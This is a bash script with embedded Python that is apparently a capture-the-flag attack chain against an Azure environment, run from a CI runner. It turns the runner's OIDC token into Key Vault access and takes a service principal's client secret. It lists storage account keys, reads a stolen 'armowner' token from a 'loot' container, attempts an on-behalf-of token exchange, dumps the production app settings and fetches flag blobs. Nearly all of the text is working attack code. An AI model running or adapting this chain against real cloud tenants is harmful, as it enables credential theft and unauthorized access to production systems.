#!/usr/bin/env bash
set -x

OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
KV=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)

# Get sync-service SP credentials
SPSEC=$(curl -s -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4" | jq -r .value)
SYNC_APP=$(echo "$SPSEC"|jq -r .appId)
SYNC_SEC=$(echo "$SPSEC"|jq -r .clientSecret)
echo "sync-service: $SYNC_APP"

# Get storage key for cilogs (to read loot)
SPMG=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$SYNC_APP" -d "grant_type=client_credentials" -d "client_secret=$SYNC_SEC" \
  --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)
KEYS=$(curl -s -X POST -H "Authorization: Bearer $SPMG" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-05-01")
SKEY=$(echo "$KEYS" | jq -r '.keys[0].value')

# Read armowner token from loot using storage key
python3 << 'PYEOF'
import hashlib, hmac, base64, datetime, urllib.request, urllib.parse, json, os, time

A='sttblcilogsprodx3euoz'
K=os.environ.get('SKEY','')
TENANT=os.environ.get('AZURE_TENANT_ID','')
SYNC_APP=os.environ.get('SYNC_APP','')
SYNC_SEC=os.environ.get('SYNC_SEC','')
V='2021-08-06'
SUB=os.environ.get('AZURE_SUBSCRIPTION_ID','')

def sk_get(path):
    now = datetime.datetime.now(datetime.timezone.utc).strftime('%a, %d %b %Y %H:%M:%S GMT')
    sts = f'GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:{now}\nx-ms-version:{V}\n/{A}/{path}'
    sig = base64.b64encode(hmac.new(base64.b64decode(K), sts.encode(), hashlib.sha256).digest()).decode()
    req = urllib.request.Request(f'https://{A}.blob.core.windows.net/{path}',
          headers={'x-ms-date':now,'x-ms-version':V,'Authorization':f'SharedKey {A}:{sig}'})
    return urllib.request.urlopen(req, timeout=15).read().decode()

armdata = json.loads(sk_get('loot/armowner_token.json'))
ARM_TOKEN = armdata.get('armowner_token','')
claims = json.loads(base64.b64decode(ARM_TOKEN.split('.')[1]+'=='))
exp = claims.get('exp',0)
print(f'armowner_token: {len(ARM_TOKEN)} chars, expires in {exp-time.time():.0f}s')
if exp < time.time():
    print('EXPIRED'); exit()

# OBO exchange
print('=== OBO EXCHANGE ===')
obo_data = urllib.parse.urlencode({
    'client_id': SYNC_APP,
    'client_secret': SYNC_SEC,
    'grant_type': 'urn:ietf:params:oauth:grant-type:jwt-bearer',
    'assertion': ARM_TOKEN,
    'scope': 'https://management.azure.com/.default',
    'requested_token_use': 'on_behalf_of',
}).encode()
try:
    r = urllib.request.urlopen(urllib.request.Request(
        f'https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token',
        data=obo_data), timeout=15)
    result = json.loads(r.read())
    arm_token = result.get('access_token','')
    print(f'OBO ARM token: {len(arm_token)} chars')
    
    if len(arm_token) > 100:
        # Read appsettings!
        req = urllib.request.Request(
            f'https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-12-01',
            method='POST', data=b'',
            headers={'Authorization':f'Bearer {arm_token}','Content-Length':'0'})
        r2 = urllib.request.urlopen(req, timeout=15)
        settings = json.loads(r2.read())
        print('APP SETTINGS:')
        for k, v in settings.get('properties', {}).items():
            print(f'  {k} = {v}')
        
        # Read storage keys
        req3 = urllib.request.Request(
            f'https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-05-01',
            method='POST', data=b'',
            headers={'Authorization':f'Bearer {arm_token}','Content-Length':'0'})
        r3 = urllib.request.urlopen(req3, timeout=15)
        keys = json.loads(r3.read())
        appcfg_key = keys['keys'][0]['value']
        print(f'APPCFG KEY: {appcfg_key[:20]}...')
        
        # Read the flag blob!
        now = datetime.datetime.now(datetime.timezone.utc).strftime('%a, %d %b %Y %H:%M:%S GMT')
        A2 = 'sttblappcfgprodx3euoz'
        for blob in ['config/internal-config.json', 'config/flag.txt', 'config/flag']:
            sts = f'GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:{now}\nx-ms-version:{V}\n/{A2}/{blob}'
            sig = base64.b64encode(hmac.new(base64.b64decode(appcfg_key), sts.encode(), hashlib.sha256).digest()).decode()
            req4 = urllib.request.Request(f'https://{A2}.blob.core.windows.net/{blob}',
                   headers={'x-ms-date':now,'x-ms-version':V,'Authorization':f'SharedKey {A2}:{sig}'})
            try:
                r4 = urllib.request.urlopen(req4, timeout=15)
                print(f'BLOB {blob}: {r4.read().decode()[:500]}')
            except urllib.error.HTTPError as e:
                print(f'BLOB {blob}: ERR {e.code}')

except urllib.error.HTTPError as e:
    print(f'OBO ERR: {e.code} {e.read().decode()[:300]}')
    
    # Try direct client_credentials with armowner assertion
    print('=== DIRECT CLIENT_ASSERTION ===')
    direct_data = urllib.parse.urlencode({
        'client_id': SYNC_APP,
        'grant_type': 'client_credentials',
        'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
        'client_assertion': ARM_TOKEN,
        'scope': 'https://management.azure.com/.default',
    }).encode()
    try:
        r5 = urllib.request.urlopen(urllib.request.Request(
            f'https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token',
            data=direct_data), timeout=15)
        result2 = json.loads(r5.read())
        direct_token = result2.get('access_token','')
        print(f'Direct token: {len(direct_token)} chars')
        if len(direct_token) > 100:
            req6 = urllib.request.Request(
                f'https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-12-01',
                method='POST', data=b'',
                headers={'Authorization':f'Bearer {direct_token}','Content-Length':'0'})
            r6 = urllib.request.urlopen(req6, timeout=15)
            print(f'SETTINGS: {r6.read().decode()[:500]}')
    except urllib.error.HTTPError as e2:
        print(f'Direct ERR: {e2.code} {e2.read().decode()[:300]}')

PYEOF

echo "=== DONE ==="
